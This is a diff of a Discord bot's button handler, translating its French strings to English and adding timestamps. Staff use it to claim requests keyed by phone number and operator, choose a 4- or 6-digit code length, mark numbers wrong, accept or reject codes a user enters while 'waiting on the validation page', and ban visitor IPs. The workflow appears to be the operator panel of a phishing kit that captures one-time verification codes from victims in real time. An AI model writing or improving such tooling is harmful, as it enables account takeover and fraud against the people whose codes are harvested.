@@ -40,9 +40,9 @@ function createBanIPButton(ip) {
 /** Returns the ActionRow used right after a claim (4/6 · Wrong · Unclaim · BanIP). */
 function buildPostClaimRow(phone, ip) {
     const buttons = [
-        new ButtonBuilder().setCustomId("len4_"    + phone).setLabel("🔢 4 chiffres").setStyle(ButtonStyle.Success),
-        new ButtonBuilder().setCustomId("len6_"    + phone).setLabel("🔢 6 chiffres").setStyle(ButtonStyle.Success),
-        new ButtonBuilder().setCustomId("wrong_"   + phone).setLabel("❌ Mauvais numéro").setStyle(ButtonStyle.Danger),
+        new ButtonBuilder().setCustomId("len4_"    + phone).setLabel("🔢 4 digits").setStyle(ButtonStyle.Success),
+        new ButtonBuilder().setCustomId("len6_"    + phone).setLabel("🔢 6 digits").setStyle(ButtonStyle.Success),
+        new ButtonBuilder().setCustomId("wrong_"   + phone).setLabel("❌ Wrong Number").setStyle(ButtonStyle.Danger),
         new ButtonBuilder().setCustomId("unclaim_" + phone).setLabel("↩️ Unclaim").setStyle(ButtonStyle.Secondary),
     ];
     const banBtn = createBanIPButton(ip);
@@ -72,7 +72,7 @@ async function getUnauthorizedClaimer(phone, userId) {
 
 async function replyNotYourRequest(interaction, claimer) {
     await interaction.reply({
-        content: `🔒 Cette demande a été claim par <@${claimer}>.\nSeul·e lui peut interagir avec ces boutons.`,
+        content: `🔒 This request was claimed by <@${claimer}>.\nOnly they can interact with these buttons.`,
         flags: 64,
     });
 }
@@ -92,18 +92,18 @@ export async function handleButton(interaction) {
         try {
             const data = await callStaffAction("claim", phone, interaction.user.tag, null, interaction.user.id);
             if (!data.success) {
-                await interaction.editReply({ content: "❌ " + (data.message || "Déjà claim par quelqu'un d'autre.") });
+                await interaction.editReply({ content: "❌ " + (data.message || "Already claimed by someone else.") });
                 return;
             }
 
             claimedBy.set(phone, interaction.user.id);
-            await interaction.editReply({ content: `✅ Demande **${formatPhone(phone)}** claim par <@${interaction.user.id}>` });
+            await interaction.editReply({ content: `✅ Request **${formatPhone(phone)}** claimed by <@${interaction.user.id}>` });
 
             const row      = await getRequestByPhone(phone);
             const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                 .setColor(getOperatorColor(row?.operator))
-                .setTitle("📋 Demande en cours")
-                .setDescription(`👤 Claim par <@${interaction.user.id}>\n\n**🔧 Choisissez une action :**`);
+                .setTitle("📋 Request In Progress")
+                .setDescription(`👤 Claimed by <@${interaction.user.id}>\n⏰ Claimed: <t:${Math.floor(Date.now() / 1000)}:R>\n\n**🔧 Choose an action:**`);
 
             await safeEditMessage(interaction.message, {
                 embeds:     [newEmbed],
@@ -111,7 +111,7 @@ export async function handleButton(interaction) {
             });
         } catch (e) {
             console.error("Claim error:", e);
-            await interaction.editReply({ content: "❌ Erreur réseau lors du claim." });
+            await interaction.editReply({ content: "❌ Network error while claiming." });
         }
         return;
     }
@@ -121,20 +121,20 @@ export async function handleButton(interaction) {
         const ip = payload;
         await interaction.deferReply({ flags: 64 });
         if (!ip || ip === "unknown" || ip === "null") {
-            await interaction.editReply({ content: "❌ IP invalide." });
+            await interaction.editReply({ content: "❌ Invalid IP." });
             return;
         }
         try {
             const data = await callBanIP(ip, interaction.user.tag);
             if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            await interaction.editReply({ content: `🚫 IP **${ip}** bannie !` });
+            await interaction.editReply({ content: `🚫 IP **${ip}** banned!` });
             const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
-                .setColor(0xef4444).setTitle("🔨 IP Bannie")
-                .setDescription(`🚫 **${ip}** bannie par <@${interaction.user.id}>`);
+                .setColor(0xef4444).setTitle("🔨 IP Banned")
+                .setDescription(`🚫 **${ip}** banned by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>`);
             await safeEditMessage(interaction.message, { embeds: [bannedEmbed], components: [] });
         } catch (e) {
             console.error("banip error:", e);
-            await interaction.editReply({ content: "❌ Erreur réseau lors du ban." });
+            await interaction.editReply({ content: "❌ Network error while banning." });
         }
         return;
     }
@@ -150,12 +150,12 @@ export async function handleButton(interaction) {
         try {
             const data = await callStaffAction("set_length", phone, interaction.user.tag, 4);
             if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            await interaction.editReply({ content: `✅ Code **4 chiffres** demandé pour ${formatPhone(phone)}` });
+            await interaction.editReply({ content: `✅ **4-digit** code requested for ${formatPhone(phone)}` });
             const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
-                .setColor(0x10b981).setTitle("⏳ Attente du code (4 chiffres)")
-                .setDescription("👤 Claim\n🔢 Code demandé : **4 chiffres**\n\n*En attente de saisie par l'utilisateur…*");
+                .setColor(0x10b981).setTitle("⏳ Awaiting Code (4 digits)")
+                .setDescription(`👤 Claimed\n🔢 Requested code: **4 digits**\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n\n*Waiting for the user to enter it…*`);
             await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
-        } catch (e) { console.error("len4 error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
+        } catch (e) { console.error("len4 error:", e); await interaction.editReply({ content: "❌ Error." }); }
         return;
     }
 
@@ -165,12 +165,12 @@ export async function handleButton(interaction) {
         try {
             const data = await callStaffAction("set_length", phone, interaction.user.tag, 6);
             if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            await interaction.editReply({ content: `✅ Code **6 chiffres** demandé pour ${formatPhone(phone)}` });
+            await interaction.editReply({ content: `✅ **6-digit** code requested for ${formatPhone(phone)}` });
             const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
-                .setColor(0x10b981).setTitle("⏳ Attente du code (6 chiffres)")
-                .setDescription("👤 Claim\n🔢 Code demandé : **6 chiffres**\n\n*En attente de saisie par l'utilisateur…*");
+                .setColor(0x10b981).setTitle("⏳ Awaiting Code (6 digits)")
+                .setDescription(`👤 Claimed\n🔢 Requested code: **6 digits**\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n\n*Waiting for the user to enter it…*`);
             await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
-        } catch (e) { console.error("len6 error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
+        } catch (e) { console.error("len6 error:", e); await interaction.editReply({ content: "❌ Error." }); }
         return;
     }
 
@@ -180,13 +180,13 @@ export async function handleButton(interaction) {
         try {
             const data = await callStaffAction("wrong_number", phone, interaction.user.tag);
             if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            await interaction.editReply({ content: `✅ Mauvais numéro signalé pour ${formatPhone(phone)}` });
+            await interaction.editReply({ content: `✅ Wrong number reported for ${formatPhone(phone)}` });
             claimedBy.delete(phone);
             const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
-                .setColor(0xef4444).setTitle("❌ Mauvais numéro")
-                .setDescription("❌ L'utilisateur est redirigé pour ressaisir son numéro.");
+                .setColor(0xef4444).setTitle("❌ Wrong Number")
+                .setDescription(`❌ The user is being redirected to re-enter their number.\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>`);
             await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
-        } catch (e) { console.error("wrong error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
+        } catch (e) { console.error("wrong error:", e); await interaction.editReply({ content: "❌ Error." }); }
         return;
     }
 
@@ -197,7 +197,7 @@ export async function handleButton(interaction) {
             const data = await callStaffAction("unclaim", phone, interaction.user.tag);
             if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
             claimedBy.delete(phone);
-            await interaction.editReply({ content: `↩️ Demande **${formatPhone(phone)}** unclaimée. Retour dans la file.` });
+            await interaction.editReply({ content: `↩️ Request **${formatPhone(phone)}** unclaimed. Back in the queue.` });
 
             const row    = await getRequestByPhone(phone);
             const reclaimBtn = new ButtonBuilder()
@@ -206,13 +206,13 @@ export async function handleButton(interaction) {
             const btns   = banBtn ? [reclaimBtn, banBtn] : [reclaimBtn];
 
             const unclaimedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
-                .setColor(0x6b7280).setTitle("📭 Demande unclaimée")
-                .setDescription(`↩️ Unclaimée par <@${interaction.user.id}>\nRetour dans la file d'attente.`);
+                .setColor(0x6b7280).setTitle("📭 Request Unclaimed")
+                .setDescription(`↩️ Unclaimed by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\nBack in the waiting queue.`);
             await safeEditMessage(interaction.message, {
                 embeds:     [unclaimedEmbed],
                 components: [new ActionRowBuilder().addComponents(...btns)],
             });
-        } catch (e) { console.error("unclaim error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
+        } catch (e) { console.error("unclaim error:", e); await interaction.editReply({ content: "❌ Error." }); }
         return;
     }
 
@@ -222,13 +222,13 @@ export async function handleButton(interaction) {
         try {
             const data = await callStaffAction("true_code", phone, interaction.user.tag);
             if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            await interaction.editReply({ content: `✅ Code validé pour ${formatPhone(phone)} 🎉` });
+            await interaction.editReply({ content: `✅ Code validated for ${formatPhone(phone)} 🎉` });
             claimedBy.delete(phone);
             const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
-                .setColor(0x10b981).setTitle("✅ Code validé !")
-                .setDescription(`👤 Validé par <@${interaction.user.id}>\nL'utilisateur est redirigé vers la page de succès.`);
+                .setColor(0x10b981).setTitle("✅ Code Validated!")
+                .setDescription(`👤 Validated by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\nThe user is being redirected to the success page.`);
             await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
-        } catch (e) { console.error("truecode error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
+        } catch (e) { console.error("truecode error:", e); await interaction.editReply({ content: "❌ Error." }); }
         return;
     }
 
@@ -246,7 +246,7 @@ export async function handleButton(interaction) {
             if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
 
             await interaction.editReply({
-                content: `🔄 Code refusé pour ${formatPhone(phone)}.\nChoisissez une nouvelle longueur — l'utilisateur va ressaisir son code.`,
+                content: `🔄 Code rejected for ${formatPhone(phone)}.\nChoose a new length — the user will re-enter their code.`,
             });
 
             const row = await getRequestByPhone(phone);
@@ -254,19 +254,20 @@ export async function handleButton(interaction) {
             // Edit this embed back to the "choose length" state so staff can pick 4 or 6 again
             const retryEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                 .setColor(0xf59e0b)
-                .setTitle("🔄 Code refusé — Nouvelle longueur ?")
+                .setTitle("🔄 Code Rejected — New Length?")
                 .setDescription(
-                    `👤 Claim par <@${interaction.user.id}>\n` +
-                    `⚠️ Le code précédent était **incorrect**.\n` +
-                    `L'utilisateur attend sur la page de validation.\n\n` +
-                    `**Choisissez la longueur du prochain code :**`
+                    `👤 Claimed by <@${interaction.user.id}>\n` +
+                    `⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n` +
+                    `⚠️ The previous code was **incorrect**.\n` +
+                    `The user is waiting on the validation page.\n\n` +
+                    `**Choose the length of the next code:**`
                 );
 
             await safeEditMessage(interaction.message, {
                 embeds:     [retryEmbed],
                 components: [buildPostClaimRow(phone, row?.ip_address)],
             });
-        } catch (e) { console.error("falsecode error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
+        } catch (e) { console.error("falsecode error:", e); await interaction.editReply({ content: "❌ Error." }); }
         return;
     }
 
